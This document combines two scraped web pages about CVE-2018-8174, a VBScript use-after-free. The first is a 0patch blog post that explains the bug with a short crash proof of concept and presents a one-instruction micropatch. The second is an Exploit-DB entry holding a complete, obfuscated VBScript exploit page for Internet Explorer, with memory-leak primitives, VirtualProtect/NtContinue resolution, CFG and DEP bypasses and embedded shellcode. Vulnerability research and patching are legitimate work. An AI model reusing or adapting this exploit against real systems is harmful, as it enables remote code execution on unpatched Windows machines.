=== Content from blog.0patch.com_9c06bb3f_20250126_034149.html ===


# [0patch Blog](https://blog.0patch.com/)

Security Patching Simplified To The Extreme

## Tuesday, May 15, 2018

Posted by

[Mitja Kolsek](https://www.blogger.com/profile/00089863558178974677 "author profile")

on

[May 15, 2018](https://blog.0patch.com/2018/05/a-single-instruction-micropatch-for.html "permanent link")

### Windows Updates Broke Your Networking? Free Micropatches To The Rescue (CVE-2018-8174)

**A Single-Instruction Micropatch For a Critical Remote Execution Issue**

by Mitja Kolsek, 0patch Team

Last week, Microsoft issued an [update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8174) resolving (among others) a critical remote code execution issue in VBScript Engine named [CVE-2018-8174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8174), exploit for which has previously been detected in the wild.

Unfortunately, Microsoft's update breaks networking on some computers (details below), prompting users to avoid their application. Windows updates are "all or nothing" these days, so users can't just remove a defective KB and enjoy the protection provided by other KBs issued on the same Patch Tuesday. Fortunately, micropatching provided by [0patch](https://0patch.com/) is the *exact opposite* of that, addressing each vulnerability individually. Let's start with the exploit and the underlying vulnerability.

It appears the exploit has been caught by at least two security firms, Kaspersky and 360, and they both issued detailed analyses of the infection chain and, more importantly for us, the vulnerability itself [[Kaspersky's analysis](https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/), [360's analysis](http://blogs.360.cn/blog/cve-2018-8174-en/)]

The vulnerability is triggered by this simple proof-of-concept provided by Kaspersky:

Dim ArrA(1)

Dim ArrB(1)

Class ClassVuln

    Private Sub Class\_Terminate()

        Set ArrB(0) = ArrA(0)

        ArrA(0) = 31337

    End Sub

End Class

Sub TriggerVuln

    Set ArrA(0) = New ClassVuln

    Erase ArrA

    Erase ArrB

End Sub

TriggerVuln

By simply saving the above code to poc.vbs and double-clicking it on a Windows computer without May 2018 updates installed, we trigger the vulnerability and get wscript.exe to crash in oleaut32.dll's VariantClear function .

|  |
| --- |
| Access Violation in OLEAUT32.DLL's VariantClear due to accessing an unallocated memory address |

Let's see what goes on here. We create two fixed-size arrays ArrA and ArrB with one element each.

A ClassVuln object is created and assigned to the first element of the ArrA array, then the ArrA array is [erased](https://msdn.microsoft.com/en-us/vba/language-reference-vba/articles/erase-statement). There is just one element in the array, namely the ClassVuln object, and Erase sets ArrA(0) to Nothing, which removes all references to the object and triggers its destruction.

Our object has a weird method called Class\_Terminate. This is a class event that's [not officially supported](https://docs.microsoft.com/en-us/dotnet/visual-basic/misc/bc42002) in VBScript anymore but apparently still works and gets called upon object's destruction. (If you're wondering why unsupported functionality still works it's probably because removing it would break an unknown number of production scripts that are using it, and cause much more headache than keeping it and removing it from documentation.)

In our Class\_Terminate, the first element of ArrB is set to ArrA(0) - but wait, ArrA(0) is the very object being destroyed, and you can imagine where this is heading. This assignment increases the reference ("lock") count for the object, but the following instruction (ArrA(0) = 31337) decreases the same reference count, which will lead to the object being actually destroyed.

However, after being destroyed, there will still be a reference to this object in ArrB(0), which is called a "dangling pointer," i.e., a pointer to a memory block that has already been freed. In this case the object was allocated on the heap, so now ArrB(0) has a reference to some location on the heap, and those versed in exploiting "use after free" issues have a nice starting point to make use of this reference.

We're not interested in exploiting this issue, however, but in patching it. To do that, we first need to understand the vulnerability.

Kaspersky researchers pointed their fingers at the VBScriptClass::Release function, which only checks the object reference count *before* calling VBScriptClass::TerminateClass (this executes our Class\_Terminate code), and doesn't account for the case where Class\_Terminate would increase the object reference count. So even though the reference count was increased (by Set ArrB(0) = ArrA(0)), the object still gets destroyed.

We're not sure that this is the (entire) root cause, although we would probably try to fix the issue using this avenue if we didn't have Microsoft's official patch that contains information on how *they* fixed it.

After applying the May 2018 Windows updates, executing the PoC has a different result:

|  |
| --- |
| Patched Windows show a runtime error |

The error states: "*Object required: 'ArrA(...)'*" in line 6, indicating that the assignment of ArrA(0) is not possible as ArrA is not an object (anymore).

First we decided to compare code execution between the patched and the unpatched version using WinDbg's [wt](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/wt--trace-and-watch-data-) (trace and watch data) command. Fortunately symbols are available for oleaut32.dll so the traces looked fairly identical up to the point where the patched version "derailed" from the unpatched version's path towards crashing. It turned out the fork happened in function vbscript!AssignVar, executed as a result of assigning ArrA(0) to ArrB(0). In this function (which hasn't been modified by the patch), a test is being made on the vt (variant type) member of a [VARIANT](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221627%28v%3Dvs.85%29.aspx) structure, which in our case denotes the ArrA(0) element. And it turns out on the unpatched computer, vt is 9 (VT\_DISPATCH) while on the patched computer, it is 0 (VT\_EMPTY).

This means someone must have changed the value of vt from 9 to 0 along the way. In order to find out who did that, we placed an access breakpoint to the address of vt sometime earlier in the execution where it was still 9 on the patched computer.

Bingo! We found a "mov word [rdi], bp" instruction in our old friend, the VariantClear function, which sets our vt to 0. (rdi points to the VARIANT structure, and ebp is 0 throughout the function.)

It was time for BinDiff. We compared the patched and the last unpatched version of oleaut32.dll (which is where the crash occurs), and looked at the modified functions. Unsurprisingly, VariantClear was slightly modified in several places (orange blocks on the image below). Three of these blocks set the vt (variant type) member of a [VARIANT](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221627%28v%3Dvs.85%29.aspx) structure to 0, which means VT\_EMPTY, or an empty object.

|  |
| --- |
| Left: unpatched code; Right: patched code |  |  |  |

Our PoC executes the middle orange block, and that block contains - in its patched version - the instruction that sets vt to 0.

So we created a micropatch that injects a logically identical instruction to the vulnerable code. Since the vulnerable code uses rbx as the pointer to the VARIANT, this is what we needed to inject:

mov word [rbx], 0

And this is the source code for our micropatch:

; Patch for CVE-2018-8174 in oleaut32.dll version 6.1.7601.23775 64bit
MODULE\_PATH "c:\windows\system32\oleaut32.dll"
PATCH\_ID 321
PATCH\_FORMAT\_VER 2
VULN\_ID 3568
PLATFORM win64

patchlet\_start
 PATCHLET\_ID 1
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x000011bf

 code\_start

  mov word [rbx], 0 ; Set VARIANT's vt to 0 (VT\_EMPTY)

 code\_end

patchlet\_end

Sure enough, applying this micropatch stopped the wscript.exe from crashing and made its behavior identical to the officially patched version:

|  |
| --- |
| The old version with our micropatch has an identical reaction to our PoC as the new version. |

Our micropatches for this vulnerability have been labeled ZP-320 and ZP-321 for
32-bit and 64-bit version of oleaut32.dll respectively, and are applicable on Windows 7 and Windows 2008 Server updated up to April 2018 Windows updates. Why only these versions? Well, updates [KB4103718](https://support.microsoft.com/en-us/help/4103718/windows-7-update-kb4103718) and [KB4103712](https://support.microsoft.com/en-us/help/4103712/windows-7-update-kb4103712) are [reportedly causing networking problems](https://news.softpedia.com/news/microsoft-confirms-windows-update-kb4103718-network-issues-521118.shtml) on some computers, which prompts users to delay their application - remaining vulnerable to the issue we have micropatched here. We have reports of Windows 7 and Windows 2008 Servers being affected, but if you or someone you know is experiencing this issue on other Windows versions, just ping us and we'll quickly port these micropatches.

As
always, if you have 0patch Agent installed, the above-mentioned micropatches should
already be present and applied on your system. If not, you can [download a free copy of 0patch Agent](http://0patch.com/download.htm) to protect your system from CVE-2018-8174 at least until Microsoft resolves the functional problems with their updates.

Cheers!

[@mkolsek](https://twitter.com/mkolsek)

[@0patch](https://twitter.com/0patch)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7114610046316422325&postID=7079411871004474811&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=7079411871004474811&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=7079411871004474811&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=7079411871004474811&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=7079411871004474811&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=7079411871004474811&target=pinterest "Share to Pinterest")

#### 1 comment:

1. ![](//resources.blogblog.com/img/blank.gif)Anonymous[October 25, 2018 at 12:04 AM](https://blog.0patch.com/2018/05/a-single-instruction-micropatch-for.html?showComment=1540451056727#c4109365229004083261)

   I'm impressed by the depth of this explanation.
   Great Job!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7114610046316422325&postID=4109365229004083261)Replies
   Reply

Add commentLoad more...

[Newer Post](https://blog.0patch.com/2018/05/0patching-foxit-reader-buffer-oops.html "Newer Post")

[Older Post](https://blog.0patch.com/2018/03/security-patching-is-hard-survey.html "Older Post")

[Home](https://blog.0patch.com/)

Subscribe to:
[Post Comments (Atom)](https://blog.0patch.com/feeds/7079411871004474811/comments/default)

## About 0patch

[0patch](https://0patch.com) (pronounced 'zero patch') is a platform for instantly distributing, applying and removing microscopic binary patches to/from running processes without having to restart these processes (much less reboot the entire computer). Brought to you by [ACROS Security](https://www.acrossecurity.com).

## Blog Archive

* ►
  [2025](https://blog.0patch.com/2025/)
  (1)
  + ►
    [January](https://blog.0patch.com/2025/01/)
    (1)

* ►
  [2024](https://blog.0patch.com/2024/)
  (23)
  + ►
    [December](https://blog.0patch.com/2024/12/)
    (1)
  + ►
    [November](https://blog.0patch.com/2024/11/)
    (4)
  + ►
    [October](https://blog.0patch.com/2024/10/)
    (2)
  + ►
    [September](https://blog.0patch.com/2024/09/)
    (1)
  + ►
    [July](https://blog.0patch.com/2024/07/)
    (2)
  + ►
    [June](https://blog.0patch.com/2024/06/)
    (2)
  + ►
    [May](https://blog.0patch.com/2024/05/)
    (1)
  + ►
    [April](https://blog.0patch.com/2024/04/)
    (4)
  + ►
    [March](https://blog.0patch.com/2024/03/)
    (1)
  + ►
    [February](https://blog.0patch.com/2024/02/)
    (4)
  + ►
    [January](https://blog.0patch.com/2024/01/)
    (1)

* ►
  [2023](https://blog.0patch.com/2023/)
  (26)
  + ►
    [November](https://blog.0patch.com/2023/11/)
    (3)
  + ►
    [October](https://blog.0patch.com/2023/10/)
    (3)
  + ►
    [September](https://blog.0patch.com/2023/09/)
    (2)
  + ►
    [August](https://blog.0patch.com/2023/08/)
    (1)
  + ►
    [July](https://blog.0patch.com/2023/07/)
    (1)
  + ►
    [June](https://blog.0patch.com/2023/06/)
    (5)
  + ►
    [May](https://blog.0patch.com/2023/05/)
    (1)
  + ►
    [April](https://blog.0patch.com/2023/04/)
    (1)
  + ►
    [March](https://blog.0patch.com/2023/03/)
    (5)
  + ►
    [February](https://blog.0patch.com/2023/02/)
    (2)
  + ►
    [January](https://blog.0patch.com/2023/01/)
    (2)

* ►
  [2022](https://blog.0patch.com/2022/)
  (26)
  + ►
    [December](https://blog.0patch.com/2022/12/)
    (3)
  + ►
    [October](https://blog.0patch.com/2022/10/)
    (6)
  + ►
    [September](https://blog.0patch.com/2022/09/)
    (3)
  + ►
    [August](https://blog.0patch.com/2022/08/)
    (2)
  + ►
    [July](https://blog.0patch.com/2022/07/)
    (2)
  + ►
    [June](https://blog.0patch.com/2022/06/)
    (3)
  + ►
    [May](https://blog.0patch.com/2022/05/)
    (2)
  + ►
    [March](https://blog.0patch.com/2022/03/)
    (4)
  + ►
    [January](https://blog.0patch.com/2022/01/)
    (1)

* ►
  [2021](https://blog.0patch.com/2021/)
  (23)
  + ►
    [December](https://blog.0patch.com/2021/12/)
    (2)
  + ►
    [November](https://blog.0patch.com/2021/11/)
    (3)
  + ►
    [October](https://blog.0patch.com/2021/10/)
    (2)
  + ►
    [September](https://blog.0patch.com/2021/09/)
    (1)
  + ►
    [August](https://blog.0patch.com/2021/08/)
    (3)
  + ►
    [July](https://blog.0patch.com/2021/07/)
    (2)
  + ►
    [June](https://blog.0patch.com/2021/06/)
    (1)
  + ►
    [May](https://blog.0patch.com/2021/05/)
    (3)
  + ►
    [March](https://blog.0patch.com/2021/03/)
    (2)
  + ►
    [February](https://blog.0patch.com/2021/02/)
    (2)
  + ►
    [January](https://blog.0patch.com/2021/01/)
    (2)

* ►
  [2020](https://blog.0patch.com/2020/)
  (19)
  + ►
    [December](https://blog.0patch.com/2020/12/)
    (2)
  + ►
    [November](https://blog.0patch.com/2020/11/)
    (2)
  + ►
    [September](https://blog.0patch.com/2020/09/)
    (1)
  + ►
    [August](https://blog.0patch.com/2020/08/)
    (2)
  + ►
    [July](https://blog.0patch.com/2020/07/)
    (3)
  + ►
    [June](https://blog.0patch.com/2020/06/)
    (2)
  + ►
    [May](https://blog.0patch.com/2020/05/)
    (2)
  + ►
    [March](https://blog.0patch.com/2020/03/)
    (1)
  + ►
    [February](https://blog.0patch.com/2020/02/)
    (2)
  + ►
    [January](https://blog.0patch.com/2020/01/)
    (2)

* ►
  [2019](https://blog.0patch.com/2019/)
  (7)
  + ►
    [September](https://blog.0patch.com/2019/09/)
    (1)
  + ►
    [June](https://blog.0patch.com/2019/06/)
    (1)
  + ►
    [April](https://blog.0patch.com/2019/04/)
    (2)
  + ►
    [February](https://blog.0patch.com/2019/02/)
    (2)
  + ►
    [January](https://blog.0patch.com/2019/01/)
    (1)

* ▼
  [2018](https://blog.0patch.com/2018/)
  (11)
  + ►
    [October](https://blog.0patch.com/2018/10/)
    (2)
  + ►
    [September](https://blog.0patch.com/2018/09/)
    (2)
  + ►
    [August](https://blog.0patch.com/2018/08/)
    (1)
  + ▼
    [May](https://blog.0patch.com/2018/05/)
    (2)
    - [0patching Foxit Reader Buffer... Oops... Integer O...](https://blog.0patch.com/2018/05/0patching-foxit-reader-buffer-oops.html)
    - [Windows Updates Broke Your Networking? Free Microp...](https://blog.0patch.com/2018/05/a-single-instruction-micropatch-for.html)
  + ►
    [March](https://blog.0patch.com/2018/03/)
    (1)
  + ►
    [February](https://blog.0patch.com/2018/02/)
    (1)
  + ►
    [January](https://blog.0patch.com/2018/01/)
    (2)

* ►
  [2017](https://blog.0patch.com/2017/)
  (19)
  + ►
    [December](https://blog.0patch.com/2017/12/)
    (1)
  + ►
    [November](https://blog.0patch.com/2017/11/)
    (4)
  + ►
    [October](https://blog.0patch.com/2017/10/)
    (2)
  + ►
    [September](https://blog.0patch.com/2017/09/)
    (2)
  + ►
    [August](https://blog.0patch.com/2017/08/)
    (1)
  + ►
    [July](https://blog.0patch.com/2017/07/)
    (1)
  + ►
    [June](https://blog.0patch.com/2017/06/)
    (1)
  + ►
    [May](https://blog.0patch.com/2017/05/)
    (1)
  + ►
    [March](https://blog.0patch.com/2017/03/)
    (2)
  + ►
    [February](https://blog.0patch.com/2017/02/)
    (3)
  + ►
    [January](https://blog.0patch.com/2017/01/)
    (1)

* ►
  [2016](https://blog.0patch.com/2016/)
  (7)
  + ►
    [September](https://blog.0patch.com/2016/09/)
    (1)
  + ►
    [July](https://blog.0patch.com/2016/07/)
    (1)
  + ►
    [June](https://blog.0patch.com/2016/06/)
    (3)
  + ►
    [January](https://blog.0patch.com/2016/01/)
    (2)

## LinkedIn and Google tags

  ![](https://px.ads.linkedin.com/collect/?pid=1234785&fmt=gif)

|  |  |
| --- | --- |

Copyright ACROS Security / 0patch. Powered by [Blogger](https://www.blogger.com).



=== Content from www.exploit-db.com_34f96a53_20250124_213836.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Internet Explorer 11 (Windows 7 x86/x64) - vbscript Code Execution

#### EDB-ID:

###### 44741

#### CVE:

###### [2018-8174](https://nvd.nist.gov/vuln/detail/CVE-2018-8174)

---

**EDB Verified:**

#### Author:

###### [smgorelik](/?author=9487)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2018-05-21

---

**Vulnerable App:**

```
<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>
<script language="vbscript">
Dim lIIl
Dim IIIlI(6),IllII(6)
Dim IllI
Dim IIllI(40)
Dim lIlIIl,lIIIll
Dim IlII
Dim llll,IIIIl
Dim llllIl,IlIIII
Dim NtContinueAddr,VirtualProtectAddr

IlII=195948557
lIlIIl=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
lIIIll=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
IllI=195890093
Function IIIII(Domain)
	lIlII=0
	IllllI=0
	IIlIIl=0
	Id=CLng(Rnd*1000000)
	lIlII=CLng((&h27d+8231-&H225b)*Rnd)Mod (&h137d+443-&H152f)+(&h1c17+131-&H1c99)
	If(Id+lIlII)Mod (&h5c0+6421-&H1ed3)=(&h10ba+5264-&H254a) Then
		lIlII=lIlII-(&h86d+6447-&H219b)
	End If

	IllllI=CLng((&h2bd+6137-&H1a6d)*Rnd)Mod (&h769+4593-&H1940)+(&h1a08+2222-&H2255)
	IIlIIl=CLng((&h14e6+1728-&H1b5d)*Rnd)Mod (&hfa3+1513-&H1572)+(&h221c+947-&H256e)
	IIIII=Domain &"?" &Chr(IllllI) &"=" &Id &"&" &Chr(IIlIIl) &"=" &lIlII
End Function

Function lIIII(ByVal lIlIl)
	IIll=""
	For index=0 To Len(lIlIl)-1
		IIll=IIll &lIlI(Asc(Mid(lIlIl,index+1,1)),2)
	Next
	IIll=IIll &"00"
	If Len(IIll)/(&h15c6+3068-&H21c0) Mod (&h1264+2141-&H1abf)=(&hc93+6054-&H2438) Then
		IIll=IIll &"00"
	End If
	For IIIl=(&h1a1a+3208-&H26a2) To Len(IIll)/(&h1b47+331-&H1c8e)-(&h14b2+4131-&H24d4)
		lIIIlI=Mid(IIll,IIIl*(&h576+1268-&Ha66)+(&ha64+6316-&H230f),(&ha49+1388-&Hfb3))
		lIlIll=Mid(IIll,IIIl*(&hf82+3732-&H1e12)+(&h210+2720-&Hcaf)+(&h4fa+5370-&H19f2),(&hf82+5508-&H2504))
		lIIII=lIIII &"%u" &lIlIll &lIIIlI
	Next
End Function
Function lIlI(ByVal Number,ByVal Length)
	IIII=Hex(Number)
	If Len(IIII)<Length Then
		IIII=String(Length-Len(IIII),"0") &IIII    'pad allign with zeros
	Else
		IIII=Right(IIII,Length)
	End If
	lIlI=IIII
End Function
Function GetUint32(lIII)
	Dim value
	llll.mem(IlII+8)=lIII+4
	llll.mem(IlII)=8		'type string
	value=llll.P0123456789
	llll.mem(IlII)=2
	GetUint32=value
End Function
Function IllIIl(lIII)
	IllIIl=GetUint32(lIII) And (131071-65536)
End Function
Function lllII(lIII)
	lllII=GetUint32(lIII)  And (&h17eb+1312-&H1c0c)
End Function
Sub llllll
End Sub
Function GetMemValue
	llll.mem(IlII)=(&h713+3616-&H1530)
	GetMemValue=llll.mem(IlII+(&h169c+712-&H195c))
End Function
Sub SetMemValue(ByRef IlIIIl)
	llll.mem(IlII+(&h715+3507-&H14c0))=IlIIIl
End Sub
Function LeakVBAddr
	On Error Resume Next
	Dim lllll
	lllll=llllll
	lllll=null
	SetMemValue lllll
	LeakVBAddr=GetMemValue()
End Function
Function GetBaseByDOSmodeSearch(IllIll)
	Dim llIl
	llIl=IllIll And &hffff0000
	Do While GetUint32(llIl+(&h748+4239-&H176f))<>544106784 Or GetUint32(llIl+(&ha2a+7373-&H268b))<>542330692
		llIl=llIl-65536
	Loop
	GetBaseByDOSmodeSearch=llIl
End Function
Function StrCompWrapper(lIII,llIlIl)
	Dim lIIlI,IIIl
	lIIlI=""
	For IIIl=(&ha2a+726-&Hd00) To Len(llIlIl)-(&h2e1+5461-&H1835)
		lIIlI=lIIlI &Chr(lllII(lIII+IIIl))
	Next
	StrCompWrapper=StrComp(UCase(lIIlI),UCase(llIlIl))
End Function
Function GetBaseFromImport(base_address,name_input)
	Dim import_rva,nt_header,descriptor,import_dir
	Dim IIIIII
	nt_header=GetUint32(base_address+(&h3c))
	import_rva=GetUint32(base_address+nt_header+&h80)
	import_dir=base_address+import_rva
	descriptor=0
	Do While True
		Dim Name
		Name=GetUint32(import_dir+descriptor*(&h14)+&hc)
		If Name=0 Then
			GetBaseFromImport=&hBAAD0000
			Exit Function
		Else
			If StrCompWrapper(base_address+Name,name_input)=0 Then
				Exit Do
			End If
		End If
		descriptor=descriptor+1
	Loop
	IIIIII=GetUint32(import_dir+descriptor*(&h14)+&h10)
	GetBaseFromImport=GetBaseByDOSmodeSearch(GetUint32(base_address+IIIIII))
End Function

Function GetProcAddr(dll_base,name)
	Dim p,export_dir,index
	Dim function_rvas,function_names,function_ordin
	Dim Illlll
	p=GetUint32(dll_base+&h3c)
	p=GetUint32(dll_base+p+&h78)
	export_dir=dll_base+p

	function_rvas=dll_base+GetUint32(export_dir+&h1c)
	function_names=dll_base+GetUint32(export_dir+&h20)
	function_ordin=dll_base+GetUint32(export_dir+&h24)
	index=0
	Do While True
		Dim lllI
		lllI=GetUint32(function_names+index*4)
		If StrCompWrapper(dll_base+lllI,name)=0 Then
			Exit Do
		End If
		index=index+1
	Loop
	Illlll=IllIIl(function_ordin+index*2)
	p=GetUint32(function_rvas+Illlll*4)
	GetProcAddr=dll_base+p
End Function

Function GetShellcode()
	IIlI=Unescape("%u0000%u0000%u0000%u0000") &Unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100%u0065%u0000%u0000%u0000%u0000%u0000%ucc00%ucccc%ucccc%ucccc%ucccc" &lIIII(IIIII("")))
	IIlI=IIlI & String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
	GetShellcode=IIlI
End Function
Function EscapeAddress(ByVal value)
	Dim High,Low
	High=lIlI((value And &hffff0000)/&h10000,4)
	Low=lIlI(value And &hffff,4)
	EscapeAddress=Unescape("%u" &Low &"%u" &High)
End Function
Function lIllIl
	Dim IIIl,IlllI,IIlI,IlIII,llllI,llIII,lIllI
	IlllI=lIlI(NtContinueAddr,8)
	IlIII=Mid(IlllI,1,2)
	llllI=Mid(IlllI,3,2)
	llIII=Mid(IlllI,5,2)
	lIllI=Mid(IlllI,7,2)
	IIlI=""
	IIlI=IIlI &"%u0000%u" &lIllI &"00"
	For IIIl=1 To 3
		IIlI=IIlI &"%u" &llllI &llIII
		IIlI=IIlI &"%u" &lIllI &IlIII
	Next
	IIlI=IIlI &"%u" &llllI &llIII
	IIlI=IIlI &"%u00" &IlIII
	lIllIl=Unescape(IIlI)
End Function
Function WrapShellcodeWithNtContinueContext(ShellcodeAddrParam) 'bypass cfg
	Dim IIlI
	IIlI=String((100334-65536),Unescape("%u4141"))
	IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
	IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
	IIlI=IIlI &EscapeAddress(&h3000)
	IIlI=IIlI &EscapeAddress(&h40)
	IIlI=IIlI &EscapeAddress(ShellcodeAddrParam-8)
	IIlI=IIlI &String(6,Unescape("%u4242"))
	IIlI=IIlI &lIllIl()
	IIlI=IIlI &String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
	WrapShellcodeWithNtContinueContext=IIlI
End Function
Function ExpandWithVirtualProtect(lIlll)
	Dim IIlI
	Dim lllllI
	lllllI=lIlll+&h23
	IIlI=""
	IIlI=IIlI &EscapeAddress(lllllI)
	IIlI=IIlI &String((&hb8-LenB(IIlI))/2,Unescape("%4141"))
	IIlI=IIlI &EscapeAddress(VirtualProtectAddr)
	IIlI=IIlI &EscapeAddress(&h1b)
	IIlI=IIlI &EscapeAddress(0)
	IIlI=IIlI &EscapeAddress(lIlll)
	IIlI=IIlI &EscapeAddress(&h23)
	IIlI=IIlI &String((&400-LenB(IIlI))/2,Unescape("%u4343"))
	ExpandWithVirtualProtect=IIlI
End Function
Sub ExecuteShellcode
	llll.mem(IlII)=&h4d 'DEP bypass
	llll.mem(IlII+8)=0
    msgbox(IlII)		'VT replaced
End Sub

Class cla1
Private Sub Class_Terminate()
	Set IIIlI(IllI)=lIIl((&h1078+5473-&H25d8))
	IllI=IllI+(&h14b5+2725-&H1f59)
	lIIl((&h79a+3680-&H15f9))=(&h69c+1650-&Hd0d)
End Sub

End Class

Class cla2
Private Sub Class_Terminate()
	Set IllII(IllI)=lIIl((&h15b+3616-&Hf7a))
	IllI=IllI+(&h880+542-&Ha9d)
	lIIl((&h1f75+342-&H20ca))=(&had3+3461-&H1857)
End Sub
End Class

Class IIIlIl
End Class

Class llIIl
Dim mem
Function P
End Function
Function SetProp(Value)
	mem=Value
	SetProp=0
End Function
End Class

Class IIIlll
Dim mem
Function P0123456789
	P0123456789=LenB(mem(IlII+8))
End Function
Function SPP
End Function
End Class

Class lllIIl
Public Default Property Get P
Dim llII
P=174088534690791e-324
For IIIl=(&h7a0+4407-&H18d7) To (&h2eb+1143-&H75c)
	IIIlI(IIIl)=(&h2176+711-&H243d)
Next
Set llII=New IIIlll
llII.mem=lIlIIl
For IIIl=(&h1729+3537-&H24fa) To (&h1df5+605-&H204c)
	Set IIIlI(IIIl)=llII
Next
End Property
End Class

Class llllII
Public Default Property Get P
Dim llII
P=636598737289582e-328
For IIIl=(&h1063+2314-&H196d) To (&h4ac+2014-&Hc84)
	IllII(IIIl)=(&h442+2598-&He68)
Next
Set llII=New IIIlll
llII.mem=lIIIll
For IIIl=(&h7eb+3652-&H162f) To (&h3e8+1657-&Ha5b)
	Set IllII(IIIl)=llII
Next
End Property
End Class

Set llllIl=New lllIIl
Set IlIIII=New llllII
Sub UAF
	For IIIl=(&hfe8+3822-&H1ed6) To (&h8b+8633-&H2233)
		Set IIllI(IIIl)=New IIIlIl
	Next
	For IIIl=(&haa1+6236-&H22e9) To (&h1437+3036-&H1fed)
		Set IIllI(IIIl)=New llIIl
	Next
	IllI=0
	For IIIl=0 To 6
		ReDim lIIl(1)
		Set lIIl(1)=New cla1
		Erase lIIl
	Next
	Set llll=New llIIl
	IllI=0
	For IIIl=0 To 6
		ReDim lIIl(1)
		Set lIIl(1)=New cla2
		Erase lIIl
	Next
	Set IIIIl=New llIIl
End Sub
Sub InitObjects
	llll.SetProp(llllIl)
	IIIIl.SetProp(IlIIII)
	IlII=IIIIl.mem
End Sub

Sub StartExploit
	UAF
	InitObjects
	vb_adrr=LeakVBAddr()
	Alert "CScriptEntryPointObject Leak: 0x" & Hex(vb_adrr) & vbcrlf & "VirtualTable address: 0x" & Hex(GetUint32(vb_adrr))
	vbs_base=GetBaseByDOSmodeSearch(GetUint32(vb_adrr))
	Alert "VBScript Base: 0x" & Hex(vbs_base)
	msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
	Alert "MSVCRT Base: 0x" & Hex(msv_base)
	krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
	Alert "KernelBase Base: 0x" & Hex(krb_base)
	ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
	Alert "Ntdll Base: 0x" & Hex(ntd_base)
	VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
	Alert "KernelBase!VirtualProtect Address 0x" & Hex(VirtualProtectAddr)
	NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
	Alert "KernelBase!VirtualProtect Address 0x" & Hex(NtContinueAddr)
	SetMemValue GetShellcode()
	ShellcodeAddr=GetMemValue()+8
	Alert "Shellcode Address 0x" & Hex(ShellcodeAddr)
	SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
	lIlll=GetMemValue()+69596
	SetMemValue ExpandWithVirtualProtect(lIlll)
	llIIll=GetMemValue()
	Alert "Executing Shellcode"
	ExecuteShellcode
End Sub
StartExploit
</script>
</body>
</html>

```

**Tags:**

**Advisory/Source:**
[Link](https://github.com/smgorelik/Windows-RCE-exploits/blob/d250b7daa07c59f5bed8b19ee3bc5a700ffca584/Web/VBScript/README.md)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
